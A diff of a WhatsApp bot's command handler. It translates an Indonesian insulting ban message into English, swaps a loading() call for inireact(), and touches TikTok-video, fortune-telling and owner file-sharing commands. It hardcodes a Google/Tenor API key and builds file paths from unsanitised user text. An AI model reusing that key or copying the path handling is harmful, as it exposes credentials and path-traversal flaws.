+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ytq5b/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 	//=================================================//
 case 'asupan2':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9a9d/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan3':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YpRr4/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan4':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YfoYm/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan5':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://www.tiktok.com/@menantu_idamannnn/video/7211912588366548251?_r=1&u_code=dgc2fmm4i3k9b1&region=ID&mid=7211912606574627610&preview_pb=0&sharer_language=id&_d=d9iga21gg7d358&share_item_id=7211912588366548251&source=h5_t&timestamp=1682941528&user_id=6914652081950639106&sec_user_id=MS4wLjABAAAABSJMM2SSvwkONssmfetetURo2KRIL-wv22KQFCPh-ARQ0bEMn7lZ3gkjm6BhZdlm&social_share_type=0&utm_source=copy&utm_campaign=client_share&utm_medium=android&share_iid=7227953970441242394&share_link_id=5530f877-35fd-4db3-9b7c-d0c8e7e749ed&share_app_id=1180&ugbiz_name=Main&ug_btm=b6880%2Cb2878`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan6':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YyKm7/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan7':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpweu7/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan8':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9Y2p/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan9':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Ygms3/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan10':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YsuNQ/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan11':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YtYaQ/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan12':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YbpvJ/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan13':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Y9FaD/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan14':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpXDPm/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan15':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS8wpvaTV/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan16':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83YaXCU/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan17':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83EKHja/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan18':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yyk6y/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case 'asupan19':
-	if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-	await loading()
+	if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+	await inireact()
 	axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=https://vt.tiktok.com/ZS83Yb7GX/`).then(({ data }) => {
 zetsubo.sendMessage(from, { video: { url: data.result.link }, mimetype: 'video/mp4', caption:`¥ Ah Sayang 🤤` })
 	})
 	break
 //=================================================//
 case "asupan20":{
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
 reply('*Ah Males Sangean*')
 }
 break
 //=================================================//
 case "darkjoke": case "darkjokes":
-await loading()
+await inireact()
  var ress = await Darkjokes()
 teks = "*Darkjokes*"
 zetsubo.sendMessage(m.chat, { image : { url : ress }, caption: teks }, { quoted:m })
 break
 //=================================================//
 case 'emojimix': { 
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
- let [emoji1, emoji2] = text.split`+`
+await inireact()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+let [emoji1, emoji2] = text.split`+`
 if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
 if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
@@ -4390,8 +4339,8 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================//
 case 'emojimix2': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 😅`
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
 for (let res of anu.results) {
@@ -4402,8 +4351,8 @@ await fs.unlinkSync(encmedia)
 break
 //=================================================//
 case 'artimimpi': case 'tafsirmimpi': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} belanja`
  let anu = await primbon.tafsir_mimpi(text)
  if (anu.status == false) return reply(anu.message)
@@ -4412,8 +4361,8 @@ await loading()
 break
 //=================================================//
 case 'ramalanjodoh': case 'ramaljodoh': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005, Putri, 16, 11, 2004`
  let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = text.split`,`
  let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
@@ -4423,8 +4372,8 @@ await loading()
 break
 //=================================================//
 case 'artinama': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} ZetsuboXygen`
  let anu = await primbon.arti_nama(text)
  if (anu.status == false) return reply(anu.message)
@@ -4433,8 +4382,8 @@ await loading()
 break
 //=================================================//
 case 'kecocokannama': case 'cocoknama': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005`
  let [nama, tgl, bln, thn] = text.split`,`
  let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
@@ -4444,8 +4393,8 @@ await loading()
 break
 //=================================================//
 case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} ZetsuboXygen|Putri`
  let [nama1, nama2] = text.split`|`
  let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
@@ -4455,8 +4404,8 @@ await loading()
 break
 //=================================================//
 case 'jadianpernikahan': case 'jadiannikah': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 6, 12, 2020`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.tanggal_jadian_pernikahan(tgl, bln, thn)
@@ -4466,8 +4415,8 @@ await loading()
 break
 //=================================================//
 case 'sifatusaha': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!ext)throw `Example : ${prefix+ command} 28, 12, 2021`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
@@ -4477,8 +4426,8 @@ await loading()
 break
 //=================================================//
 case 'rejeki': case 'rezeki': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.rejeki_hoki_weton(tgl, bln, thn)
@@ -4488,8 +4437,8 @@ await loading()
 break
 //=================================================//
 case 'pekerjaan': case 'kerja': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.pekerjaan_weton_lahir(tgl, bln, thn)
@@ -4499,8 +4448,8 @@ await loading()
 break
 //=================================================//
 case 'ramalannasib': case 'ramalnasib': case 'nasib': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.ramalan_nasib(tgl, bln, thn)
@@ -4510,8 +4459,8 @@ await loading()
 break
 //=================================================//
 case 'potensipenyakit': case 'penyakit': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.cek_potensi_penyakit(tgl, bln, thn)
@@ -4521,8 +4470,8 @@ await loading()
 break
 //=================================================//
 case 'artitarot': case 'tarot': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.arti_kartu_tarot(tgl, bln, thn)
@@ -4532,8 +4481,8 @@ await loading()
 break
 //=================================================//
 case 'fengshui': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 1, 2005\n\nNote : ${prefix + command} Nama, gender, tahun lahir\nGender : 1 untuk laki-laki & 2 untuk perempuan`
  let [nama, gender, tahun] = text.split`,`
  let anu = await primbon.perhitungan_feng_shui(nama, gender, tahun)
@@ -4543,8 +4492,8 @@ await loading()
 break
 //=================================================//
 case 'haribaik': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.petung_hari_baik(tgl, bln, thn)
@@ -4554,8 +4503,8 @@ await loading()
 break
 //=================================================//
 case 'harisangar': case 'taliwangke': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.hari_sangar_taliwangke(tgl, bln, thn)
@@ -4565,8 +4514,8 @@ await loading()
 break
 //=================================================//
 case 'harinaas': case 'harisial': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.primbon_hari_naas(tgl, bln, thn)
@@ -4604,8 +4553,8 @@ if (!text) return replygc('What location?')
            break
 //=================================================//
 case 'arahrejeki': case 'arahrezeki': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 7, 7, 2005`
  let [tgl, bln, thn] = text.split`,`
  let anu = await primbon.primbon_arah_rejeki(tgl, bln, thn)
@@ -4615,8 +4564,8 @@ await loading()
 break
 //=================================================//
 case 'peruntungan': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005, 2022\n\nNote : ${prefix + command} Nama, tanggal lahir, bulan lahir, tahun lahir, untuk tahun`
  let [nama, tgl, bln, thn, untuk] = text.split`,`
  let anu = await primbon.ramalan_peruntungan(nama, tgl, bln, thn, untuk)
@@ -4637,8 +4586,8 @@ let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
 break
 //=================================================//
 case 'sifat': case 'karakter': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} ZetsuboXygen, 7, 7, 2005`
  let [nama, tgl, bln, thn] = text.split`,`
  let anu = await primbon.sifat_karakter_tanggal_lahir(nama, tgl, bln, thn)
@@ -4677,7 +4626,8 @@ https://cloud.google.com/translate/docs/languages
     break
 //=================================================//
 case 'play':
-    case 'play2': {
+    case 'music': {
+	 await inireact()
         if (!text) {
             reply('𝐏𝐫𝐨𝐯𝐢𝐝𝐞 𝐚 𝐬𝐞𝐚𝐫𝐜𝐡 𝐭𝐞𝐫𝐦!\n𝐄.𝐠: 𝙷𝙴𝙰𝙳𝙻𝙸𝙶𝙷𝚃𝚂 𝙱𝚈 𝙰𝙻𝙰𝙽 𝚆𝙰𝙻𝙺𝙴𝚁')
             return;
@@ -4725,7 +4675,7 @@ case 'play':
                         document: fs.readFileSync(`./${randomName}`),
                         mimetype: "audio/mpeg",
                         fileName: titleYt + ".mp3",
-			caption: "➻ 𝐁𝐘 𝐂𝐋𝐀𝐒𝐒𝐈𝐂_𝐁𝐎𝐓 ❖ ",    
+			caption: "💢 𝐂𝐋𝐀𝐒𝐒𝐈𝐂_𝐁𝐎𝐓 𝐁𝐘 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 🩸 ",    
                     }, {
                         quoted: m 
                     }
@@ -4741,8 +4691,8 @@ case 'play':
 break;
 //=================================================//
 case 'masasubur': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`
  let [tgl, bln, thn, siklus] = text.split`,`
  let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
@@ -4752,8 +4702,8 @@ await loading()
 break
 //=================================================//
 case 'zodiak': case 'zodiac': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix+ command} 7 7 2005`
  let zodiak = [
  ["capricorn", new Date(1970, 0, 1)],
@@ -4788,8 +4738,8 @@ await loading()
 break
 //=================================================//
 case 'shio': {
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  if (!text) throw `Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`
  let anu = await primbon.shio(text)
  if (anu.status == false) return reply(anu.message)
@@ -4799,10 +4749,10 @@ break
 //=================================================//
 case 'setcmd': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (!m.quoted) throw 'Reply Pesan!'
 if (!m.quoted.fileSha256) throw 'SHA256 Hash Missing'
-if (!text) throw `Untuk Command Apa?`
+if (!text) throw `Which cmd do you need??`
 let hash = m.quoted.fileSha256.toString('base64')
 if (global.db.data.sticker[hash] && global.db.data.sticker[hash].locked) throw 'You have no permission to change this sticker command'
 global.db.data.sticker[hash] = {
@@ -4818,7 +4768,7 @@ break
 //=================================================//
 case 'delcmd': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (!m.quoted) throw 'Reply Pesan!'
 let hash = m.quoted.fileSha256.toString('base64')
 if (!hash) throw `Tidak ada hash`
@@ -4830,7 +4780,7 @@ break
 //=================================================//
 case 'delpdf':{
 if (!isCreator) return m.reply('*Khusus Owner Bot*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Masukan query')
 var teks = text
 {
@@ -4846,7 +4796,7 @@ break
 //=================================================//
 case 'delpdf':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Masukan query')
 var teks = `${text}`
 {
@@ -4862,7 +4812,7 @@ break
 //=================================================//
 case 'listpdf': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 let teksoooo = '┌──⭓「 *LIST PDF* 」\n┃\n'
 for (let x of docunye) {
 teksoooo = `┃⭔ ${x}\n`
@@ -4874,7 +4824,7 @@ break
 //=================================================//
 case 'yopdf':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 var teks = `${text}`
 {
 zetsubo.sendMessage(from, { document: fs.readFileSync(`./database/Docu/${teks}.pdf`), mimetype: 'application/pdf', fileName: `${teks}`, caption: `${teks}` }, { quoted:m})
@@ -4884,7 +4834,7 @@ break
 //=================================================//
 case 'sendpdf': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listpdf`)
 var teks = `${text}`
 {
@@ -4896,7 +4846,7 @@ break
 //=================================================//
 case 'addzip':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Nama zip apa')
 var teks = `${text}`
 {
@@ -4913,7 +4863,7 @@ break
 //=================================================//
 case 'delzip':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Masukan text yang ada di list zip')
 var teks = `${text}`
 {
@@ -4929,7 +4879,7 @@ break
 //=================================================//
 case 'listzip': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 let teksooooo = '┌──⭓「 *LIST ZIP* 」\n┃\n'
 for (let x of zipnye) {
 teksooooo = `┃⭔ ${x}\n`
@@ -4941,7 +4891,7 @@ break
 //=================================================//
 case 'yozip':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Masukan text yang ada di list zip')
 var teks = `${text}`
 {
@@ -4952,7 +4902,7 @@ break
 //=================================================//
 case 'sendzip': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
 var teks = `${text}`
 {
@@ -4964,7 +4914,7 @@ break
 //=================================================//
 case 'addapk':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Nama apk apa')
 var teks = `${text}`
 {
@@ -4981,7 +4931,7 @@ break
 //=================================================//
 case 'delapk':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Masukan text yang ada di listapk')
 var teks = `${text}`
 {
@@ -4997,7 +4947,7 @@ break
 //=================================================//
 case 'listapk': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 let teksoooooo = '┌──⭓「 *LIST APK* 」\n│\n'
 for (let x of apknye) {
 teksoooooo = `│⭔ ${x}\n`
@@ -5009,7 +4959,7 @@ break
 //=================================================//
 case 'yoapk':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Masukan text yang ada di listapk')
 var teks = `${text}`
 {
@@ -5020,7 +4970,7 @@ break
 //=================================================//
 case 'sendapk': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (!text) return reply(`Lah, Reply Chat Orang Nya Masukin Text Yang Ada Di Listzip`)
 var teks = `${text}`
 {
@@ -5032,7 +4982,7 @@ break
 //=================================================//
 case 'addvn':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Nama audionya apa')
 if (vnnye.includes(text)) return reply("Nama tersebut sudah di gunakan")
 let delb = await zetsubo.downloadAndSaveMediaMessage(quoted)
@@ -5046,7 +4996,7 @@ break
 //=================================================//
 case 'delvn':{
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
 if (args.length < 1) return reply('Masukan query')
 if (!vnnye.includes(text)) return reply("Nama tersebut tidak ada di dalam data base")
 let wanu = vnnye.indexOf(text)
@@ -5058,8 +5008,8 @@ reply(`Sukses delete vn ${text}`)
 break
 //=================================================//
 case 'listvn':{
-if (isBan) return reply('*Lu Di Ban Owner Gak Usah Sok asik Tolol*')
-await loading()
+if (isBan) return reply('*Youre are banned with the owner. You dont have to act cool *')
+await inireact()
  let teksooo = '┌──⭓「 *LIST VN* 」\n│\n'
 for (let x of vnnye) {
 teksooo += `│⭔ ${x}\n`
@@ -5070,7 +5020,7 @@ break
 //=================================================//
 case 'addmsg': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
  if (!m.quoted) throw 'Reply Pesan Yang Ingin Disave Di Database'
  if (!text) throw `Example : ${prefix + command} nama file`
  let msgs = global.db.data.database
@@ -5086,7 +5036,7 @@ break
 //=================================================//
 case 'sendlist': {
 if (!isCreator) return reply('*Premium Only*')
-await loading()
+await inireact()
  if (!text) throw `Example : ${prefix + command} file name\n\nLihat list pesan dengan ${prefix}listmsg`
  let msgs = global.db.data.database
